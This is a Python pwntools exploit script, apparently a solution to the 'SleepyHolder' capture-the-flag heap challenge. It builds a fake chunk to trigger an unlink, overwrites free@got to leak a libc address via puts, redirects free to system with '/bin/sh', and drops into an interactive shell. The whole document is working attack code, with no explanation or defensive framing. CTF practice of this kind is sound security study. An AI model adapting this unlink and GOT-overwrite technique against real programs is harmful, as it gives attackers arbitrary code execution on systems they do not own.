from pwn import *

#context.log_level = 'debug'

e = ELF('SleepyHolder')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def read_banner():
    r.recvuntil("3. Renew secret\n")

def keep_secret(opt, data):
    read_banner()
    r.send("1\n")
    r.send("%d\n" % opt)
    r.recvuntil("secret: \n")
    r.send(data)

def wipe_secret(opt):
    read_banner()
    r.send("2\n")
    r.recvuntil("Big secret\n")
    r.send("%d\n" % opt)

def renew_secret(opt, data):
    read_banner()
    r.send("3\n")
    r.recvuntil("Big secret\n")
    r.send("%d\n" % opt)
    r.recvuntil("secret: \n")
    r.send(data)

small_buf_ptr = 0x6020d0

r = remote('localhost', 9999)
keep_secret(1, "A" * 0x28)
keep_secret(2, "A" * 0x28)
wipe_secret(1)
keep_secret(3, "A" * 0x28)
wipe_secret(1)
# Fake chunk: [0x20, 0x20, fd, bk] + prev_size of the next chunk
keep_secret(1, p64(0x20) + p64(0x20) + p64(small_buf_ptr - 8 * 3) + p64(small_buf_ptr - 8 * 2) + p64(0x20))

# unlink()
wipe_secret(2)

# *small_buf_ptr = small_buf_ptr - 8 * 3
ptr = small_buf_ptr - 8 * 3

# big_buf_ptr = free@got
renew_secret(1, p64(0) + p64(e.got['free']) + p64(0) + p64(ptr) + p64(1))
# modify free@got -> puts
renew_secret(2, p64(e.plt['puts']))
# big_buf_ptr = puts@got
renew_secret(1, p64(0) + p64(e.got['puts']))
# leak
wipe_secret(2)

libc_base = u64(r.readline().strip().ljust(8, "\x00")) - libc.symbols['puts']
print("LIBC_BASE: %16X" % libc_base)

system = libc_base + libc.symbols['system']
print("SYSTEM: %16X" % system)

bin_sh = libc_base + libc.search('/bin/sh').next()
print("/bin/sh: %16X" % bin_sh)

# big_buf_ptr = free@got
renew_secret(1, p64(0) + p64(e.got['free']) + p64(0) + p64(ptr) + p64(1))
# modify free@got -> system
renew_secret(2, p64(system))
# big_buf_ptr = "/bin/sh"
renew_secret(1, p64(0) + p64(bin_sh))
wipe_secret(2)

r.interactive()
